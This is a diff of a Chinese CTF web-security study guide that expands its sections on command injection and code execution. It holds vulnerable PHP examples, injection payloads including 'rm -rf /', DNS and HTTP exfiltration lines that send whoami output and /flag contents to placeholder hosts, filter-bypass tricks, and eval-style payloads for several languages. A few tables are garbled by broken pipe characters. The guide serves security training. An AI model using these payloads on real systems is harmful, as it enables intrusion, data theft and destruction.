@@ -34,7 +34,7 @@
   <meta itemprop="description" content="持续更新的CTF Web知识体系与刷题总结。">
   <meta itemprop="datePublished" content="2025-12-22T22:43:35+08:00">
   <meta itemprop="dateModified" content="2025-12-22T22:43:35+08:00">
-  <meta itemprop="wordCount" content="639">
+  <meta itemprop="wordCount" content="1310">
   <meta itemprop="image" content="https://decimo.top/images/1.png">
   <meta itemprop="keywords" content="CTF,Web">
   <meta property="og:image:alt" content="[持续更新] CTF-Web Guide" />
@@ -265,7 +265,7 @@ decimo的小窝
     <h1 class="card-title post-title my-2">[持续更新] CTF-Web Guide</h1>
   </div>
   <div class="card-body"><div class="post-meta mb-3">
-  <span class="post-date me-1 mb-1" title="created on 2025-12-22 22:43:35 &#43;0800 CST.">December 22, 2025</span><span class="post-reading-time me-1 mb-1">6 min read</span><a href="/categories/guide/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+  <span class="post-date me-1 mb-1" title="created on 2025-12-22 22:43:35 &#43;0800 CST.">December 22, 2025</span><span class="post-reading-time me-1 mb-1">13 min read</span><a href="/categories/guide/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
       <i class="fas fa-fw fa-folder me-1"></i>Guide</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a>
 </div>
 
@@ -648,40 +648,602 @@ Disallow: /hidden/flag.txt
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div>
 <h3 id="命令执行-rcecommand-injection" data-numberify>命令执行 (RCE/Command Injection)：<a class="anchor ms-1" href="#命令执行-rcecommand-injection"></a></h3>
+
+<h4 id="1原理" data-numberify>1.原理<a class="anchor ms-1" href="#1原理"></a></h4>
+<p>开发者把<strong>用户输入</strong>直接当作<strong>系统命令</strong>的一部分去执行时，就会导致命令执行。</p>
+<p>典型错误代码（PHP）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;ip&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ping -c 4 &#34;</span> <span style="color:#f92672">.</span> $ip);  <span style="color:#75715e">// 开发者想实现ping功能
+</span></span></span></code></pre></div><p>如果用户传入 <code>8.8.8.8; rm -rf /</code>，最终执行的命令就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 8.8.8.8; rm -rf /
+</span></span></code></pre></div><p>分号 <code>;</code> 让系统执行完ping后，顺手执行了删库命令。</p>
+<p><strong>操作命令符详解</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">符号</th>
+          <th style="text-align: left">名称</th>
+          <th style="text-align: left">执行逻辑</th>
+          <th style="text-align: left">典型Payload</th>
+          <th style="text-align: left">利用场景</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>;</code></td>
+          <td style="text-align: left">顺序执行</td>
+          <td style="text-align: left"><strong>不管前面成功失败，后面照跑</strong></td>
+          <td style="text-align: left"><code>ping 127.0.0.1; whoami</code></td>
+          <td style="text-align: left"><strong>最通用</strong>，无脑首选</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>&amp;</code></td>
+          <td style="text-align: left">后台执行</td>
+          <td style="text-align: left">前面命令放后台运行，<strong>立即执行后面</strong></td>
+          <td style="text-align: left"><code>ping 127.0.0.1 &amp; whoami</code></td>
+          <td style="text-align: left">不在乎前面输出，只管注入</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>&amp;&amp;</code></td>
+          <td style="text-align: left">逻辑与</td>
+          <td style="text-align: left"><strong>前面成功(返回0)才执行后面</strong></td>
+          <td style="text-align: left"><code>ping 127.0.0.1 &amp;&amp; whoami</code></td>
+          <td style="text-align: left">避免报错暴露，更隐蔽</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">`</td>
+          <td style="text-align: left">`</td>
+          <td style="text-align: left">管道符</td>
+          <td style="text-align: left">前面输出作为后面的<strong>输入</strong></td>
+          <td style="text-align: left">`cat /flag</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">`</td>
+          <td style="text-align: left"></td>
+          <td style="text-align: left">`</td>
+          <td style="text-align: left">逻辑或</td>
+          <td style="text-align: left"><strong>前面失败(返回非0)才执行后面</strong></td>
+      </tr>
+  </tbody>
+</table>
+
+<h4 id="2常见触发函数" data-numberify>2.常见触发函数<a class="anchor ms-1" href="#2常见触发函数"></a></h4>
+<p><strong>PHP</strong></p>
 <ul>
-<li>
-<p>常见触发函数 (system, exec, etc.)。</p>
-</li>
-<li>
-<p>无回显 RCE (DNSLog 外带)。</p>
-</li>
-<li>
-<p>字符限制绕过 (利用通配符、环境变量拼凑命令)。</p>
-<ol>
-<li>代码执行 (Code Execution)：</li>
-</ol>
+<li><code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>（无反引号）</li>
+<li><code>passthru()</code>、<code>popen()</code>、<code>proc_open()</code></li>
+<li><strong>反引号</strong>：<code>ls</code> 等价于 <code>shell_exec()</code></li>
+<li><code>eval()</code>（严格来说是代码执行，但经常和命令执行混用）</li>
+</ul>
+<p><strong>Python</strong></p>
+<ul>
+<li><code>os.system()</code>、<code>os.popen()</code>、<code>subprocess.Popen()</code>、<code>subprocess.call()</code></li>
+</ul>
+<p><strong>Java</strong></p>
+<ul>
+<li><code>Runtime.getRuntime().exec()</code>、<code>ProcessBuilder</code></li>
+</ul>
+<p><strong>Node.js</strong></p>
+<ul>
+<li><code>child_process.exec()</code>、<code>child_process.spawn()</code></li>
+</ul>
+<p>看到参数直接拼在函数名后面，可试探：</p>
+<pre tabindex="0"><code>?cmd=id
+?ip=127.0.0.1;whoami
+?file=test.txt|ls
+</code></pre><p>当页面回显指令执行结果时，利用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 查看当前用户</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>whoami
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看当前目录</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>ls
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 直接读flag</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>cat /flag
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>cat flag.php
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>tac flag.php      <span style="color:#75715e"># tac是cat的反向输出</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>more flag.php
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>less flag.php
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>head flag.php
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>tail flag.php
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#cat被过滤时找其他方法读取flag</span>
+</span></span></code></pre></div>
+<h4 id="3无回显-rce" data-numberify>3.无回显 RCE<a class="anchor ms-1" href="#3无回显-rce"></a></h4>
+<p>命令执行了，但页面<strong>一片空白</strong>或只返回固定内容（如 <code>ping</code> 输出被丢弃）。</p>
+
+<h5 id="dns外带" data-numberify>DNS外带<a class="anchor ms-1" href="#dns外带"></a></h5>
+<p>利用 <code>dig</code> 或 <code>nslookup</code> 将数据带出：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Linux</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>nslookup <span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span>.your-dnslog.cn
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>dig <span style="color:#66d9ef">$(</span>cat /flag | base64<span style="color:#66d9ef">)</span>.your-dnslog.cn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Windows（CTF较少见）</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>ping %USERNAME%.your-dnslog.cn
+</span></span></code></pre></div>
+<h5 id="http外带" data-numberify>HTTP外带<a class="anchor ms-1" href="#http外带"></a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>curl http://your-server.com/<span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>wget http://your-server.com/<span style="color:#66d9ef">$(</span>cat /flag | base64<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div>
+<h4 id="4字符限制绕过" data-numberify>4.字符限制绕过<a class="anchor ms-1" href="#4字符限制绕过"></a></h4>
+<p>当 <code>空格</code> 被WAF拦截时：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">替代方案</th>
+          <th style="text-align: left">示例</th>
+          <th style="text-align: left">说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>$IFS</code></td>
+          <td style="text-align: left"><code>cat$IFS/flag</code></td>
+          <td style="text-align: left">Linux内部字段分隔符</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>$IFS$1</code></td>
+          <td style="text-align: left"><code>cat$IFS$1/flag</code></td>
+          <td style="text-align: left"><code>$1</code> 变为空，常用绕过</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>${IFS}</code></td>
+          <td style="text-align: left"><code>cat${IFS}/flag</code></td>
+          <td style="text-align: left">花括号版本</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>%09</code></td>
+          <td style="text-align: left"><code>cat%09/flag</code></td>
+          <td style="text-align: left">URL编码的Tab符</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>%0a</code></td>
+          <td style="text-align: left"><code>cat%0a/flag</code></td>
+          <td style="text-align: left">URL编码的换行符</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>&lt;&gt;</code></td>
+          <td style="text-align: left"><code>cat&lt;&gt;/flag</code></td>
+          <td style="text-align: left">重定向符号</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>{,}</code></td>
+          <td style="text-align: left"><code>{cat,/flag}</code></td>
+          <td style="text-align: left">花括号展开</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>$()</code></td>
+          <td style="text-align: left"><code>cat$(echo /flag)</code></td>
+          <td style="text-align: left">命令替换</td>
+      </tr>
+  </tbody>
+</table>
+<p>常用命令被拦截时</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">场景</th>
+          <th style="text-align: left">绕过方式</th>
+          <th style="text-align: left">示例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>cat被过滤</strong></td>
+          <td style="text-align: left">使用替代命令</td>
+          <td style="text-align: left"><code>tac</code> <code>more</code> <code>less</code> <code>head</code> <code>tail</code> <code>nl</code> <code>sort</code> <code>od</code> <code>xxd</code> <code>base64</code> <code>strings</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>flag被过滤</strong></td>
+          <td style="text-align: left">通配符</td>
+          <td style="text-align: left"><code>cat /fl*</code> <code>cat /f???</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>cat和flag都被过滤</strong></td>
+          <td style="text-align: left">拼接法</td>
+          <td style="text-align: left"><code>c''at /fl''ag</code> <code>c&quot;a&quot;t /fl&quot;ag&quot;</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>关键字整体过滤</strong></td>
+          <td style="text-align: left">环境变量拼接</td>
+          <td style="text-align: left"><code>a=c;b=at;$a$b /flag</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>反引号被过滤</strong></td>
+          <td style="text-align: left"><code>$()</code>替代</td>
+          <td style="text-align: left"><code>id</code> → <code>$(id)</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>分号被过滤</strong></td>
+          <td style="text-align: left">换行符 <code>%0a</code></td>
+          <td style="text-align: left"><code>ping 127.0.0.1%0awhoami</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">**管道符 `</td>
+          <td style="text-align: left">` 被过滤**</td>
+          <td style="text-align: left">用 `</td>
+      </tr>
+  </tbody>
+</table>
+<p>通配符详解：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /fl*        <span style="color:#75715e"># 匹配所有以fl开头的文件</span>
+</span></span><span style="display:flex;"><span>cat /f???       <span style="color:#75715e"># ? 匹配一个字符，匹配 flag</span>
+</span></span><span style="display:flex;"><span>cat /f<span style="color:#f92672">[</span>a-z<span style="color:#f92672">]</span>g    <span style="color:#75715e"># 字符集匹配</span>
+</span></span><span style="display:flex;"><span>cat /<span style="color:#f92672">[</span>!0-9<span style="color:#f92672">]</span>*    <span style="color:#75715e"># 排除数字开头的文件</span>
+</span></span></code></pre></div><p>利用环境变量拼凑命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 从系统变量中取字符拼出命令</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">${</span>PATH<span style="color:#e6db74">}</span>     <span style="color:#75715e"># /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">${</span>PATH:0:1<span style="color:#e6db74">}</span> <span style="color:#75715e"># /</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">${</span>PATH:5:1<span style="color:#e6db74">}</span> <span style="color:#75715e"># l</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#同理就像这样拼出 cat /flag</span>
+</span></span></code></pre></div><p>输入长度被限制（如只能输入5个字符）。</p>
+<p>利用 <code>&gt; 文件名</code> 创建文件，再通过 <code>ls -t</code> 按时间排序，最后 <code>sh</code> 执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 每次输入一个短命令，逐步构建</span>
+</span></span><span style="display:flex;"><span>&gt; dir
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;sl&#34;</span>        <span style="color:#75715e"># 注意方向，实际利用时反向写入</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;tac&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;fl&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;g\\&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;\\&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;\\&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;\\&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;\\&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;\\&#34;</span>
+</span></span><span style="display:flex;"><span>&gt; sh
+</span></span></code></pre></div><p>双写绕过</p>
+<p>很多WAF或过滤函数会做<strong>字符串替换</strong>，比如把 <code>flag</code> 替换成空字符串。但如果<strong>只替换一次</strong>，攻击者可以利用<strong>双写</strong>来绕过。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;flag&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>($cmd);
+</span></span></code></pre></div><p>攻击者传入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat flflagag
+</span></span></code></pre></div>
+<h3 id="代码执行-code-execution" data-numberify>代码执行 (Code Execution)：<a class="anchor ms-1" href="#代码执行-code-execution"></a></h3>
+<p>代码执行和命令执行的区别：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">维度</th>
+          <th style="text-align: left"><strong>命令执行</strong></th>
+          <th style="text-align: left"><strong>代码执行</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>执行环境</strong></td>
+          <td style="text-align: left">操作系统Shell（bash/cmd）</td>
+          <td style="text-align: left">编程语言解释器（PHP/Python/Java等）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>典型函数</strong></td>
+          <td style="text-align: left"><code>system()</code>、<code>exec()</code>、<code>shell_exec()</code></td>
+          <td style="text-align: left"><code>eval()</code>、<code>assert()</code>、<code>preg_replace('/e')</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>执行内容</strong></td>
+          <td style="text-align: left"><code>ls</code>、<code>whoami</code>、<code>cat /flag</code></td>
+          <td style="text-align: left"><code>phpinfo();</code>、<code>system('ls')</code>、<code>__import__('os')</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>一句话区分</strong></td>
+          <td style="text-align: left">让服务器<strong>执行系统命令</strong></td>
+          <td style="text-align: left">让服务器<strong>执行代码</strong></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>最终目的</strong></td>
+          <td style="text-align: left">直接读取文件/getshell</td>
+          <td style="text-align: left">先执行代码，再<strong>通过代码调系统命令</strong></td>
+      </tr>
+  </tbody>
+</table>
 <ul>
 <li><code>eval()</code>, <code>assert()</code> 的滥用。</li>
 </ul>
-<ol start="2">
-<li>模板注入 (SSTI)：</li>
-</ol>
+
+<h4 id="常见触发函数" data-numberify>常见触发函数<a class="anchor ms-1" href="#常见触发函数"></a></h4>
+<p>PHP（CTF出现频率最高）</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">函数</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">示例Payload</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>eval()</code></td>
+          <td style="text-align: left">把字符串当PHP代码执行</td>
+          <td style="text-align: left"><code>eval($_GET[1])</code> → <code>?1=phpinfo();</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>assert()</code></td>
+          <td style="text-align: left">类似eval，但<strong>字符串参数</strong>才执行</td>
+          <td style="text-align: left"><code>assert($_GET[1])</code> → <code>?1=phpinfo()</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>preg_replace('/e')</code></td>
+          <td style="text-align: left">正则替换时执行代码（PHP 5.5+已废弃）</td>
+          <td style="text-align: left"><code>preg_replace('/.*/e', $_GET[1], '')</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>create_function()</code></td>
+          <td style="text-align: left">创建匿名函数并执行</td>
+          <td style="text-align: left"><code>create_function('',$_GET[1])</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>array_map()</code></td>
+          <td style="text-align: left">回调执行</td>
+          <td style="text-align: left"><code>array_map('assert', $_GET[1])</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>usort()</code> / <code>uasort()</code></td>
+          <td style="text-align: left">自定义排序函数</td>
+          <td style="text-align: left"><code>usort($_GET, 'assert')</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>call_user_func()</code></td>
+          <td style="text-align: left">调用回调函数</td>
+          <td style="text-align: left"><code>call_user_func('assert', $_GET[1])</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>system()</code> / <code>exec()</code></td>
+          <td style="text-align: left">其实也算代码执行的&quot;下游&quot;</td>
+          <td style="text-align: left">见命令执行章节</td>
+      </tr>
+  </tbody>
+</table>
+<p>Python（Flask/SSTI场景）</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">函数/方法</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">示例Payload</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>eval()</code></td>
+          <td style="text-align: left">同PHP</td>
+          <td style="text-align: left"><code>eval(&quot;__import__('os').popen('ls').read()&quot;)</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>exec()</code></td>
+          <td style="text-align: left">执行代码块</td>
+          <td style="text-align: left"><code>exec(&quot;print(open('/flag').read())&quot;)</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>compile()</code></td>
+          <td style="text-align: left">编译后执行</td>
+          <td style="text-align: left"><code>exec(compile('print(1)','','exec'))</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>__import__()</code></td>
+          <td style="text-align: left">动态导入模块</td>
+          <td style="text-align: left"><code>__import__('os').system('ls')</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>JavaScript/Node.js</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">函数</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">示例Payload</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>eval()</code></td>
+          <td style="text-align: left">同PHP/Python</td>
+          <td style="text-align: left"><code>eval(&quot;require('child_process').exec('ls')&quot;)</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>new Function()</code></td>
+          <td style="text-align: left">创建函数并执行</td>
+          <td style="text-align: left"><code>new Function('return process')()</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>setTimeout()</code> / <code>setInterval()</code></td>
+          <td style="text-align: left">字符串参数会被执行</td>
+          <td style="text-align: left"><code>setTimeout(&quot;console.log(1)&quot;, 1000)</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>Java（反序列化/表达式注入）</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">函数/框架</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">示例Payload</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>Runtime.getRuntime().exec()</code></td>
+          <td style="text-align: left">执行系统命令</td>
+          <td style="text-align: left">见命令执行章节</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>ScriptEngineManager</code></td>
+          <td style="text-align: left">执行JS/Python代码</td>
+          <td style="text-align: left"><code>engine.eval(&quot;java.lang.Runtime.getRuntime().exec('ls')&quot;)</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">OGNL/SpEL表达式</td>
+          <td style="text-align: left">框架表达式注入</td>
+          <td style="text-align: left"><code>${7*7}</code> → <code>49</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>ProcessBuilder</code></td>
+          <td style="text-align: left">执行系统命令</td>
+          <td style="text-align: left"><code>new ProcessBuilder(&quot;ls&quot;).start()</code></td>
+      </tr>
+  </tbody>
+</table>
+
+<h4 id="基础利用有回显" data-numberify>基础利用（有回显）<a class="anchor ms-1" href="#基础利用有回显"></a></h4>
+<p>拿到代码执行点后，<strong>先确认能执行什么</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 测试PHP代码执行
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">phpinfo</span>();          <span style="color:#75715e">// 看是否执行，同时确认disable_functions
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span> <span style="color:#ae81ff">123</span>;           <span style="color:#75715e">// 简单回显测试
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;/&#39;</span>));  <span style="color:#75715e">// 列出根目录
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>));  <span style="color:#75715e">// 直接读flag
+</span></span></span></code></pre></div><p><strong>CTF最常用Payload（PHP）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 1. 直接读文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">readfile</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>);   <span style="color:#75715e">// 高亮显示源码
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>);          <span style="color:#75715e">// 把flag当PHP代码包含进来（会输出）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 2. 列目录（找flag在哪）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;/&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;/var/www/html&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;.&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 3. 执行系统命令（如果system没被禁用）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>, $o); <span style="color:#a6e22e">var_dump</span>($o);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>);
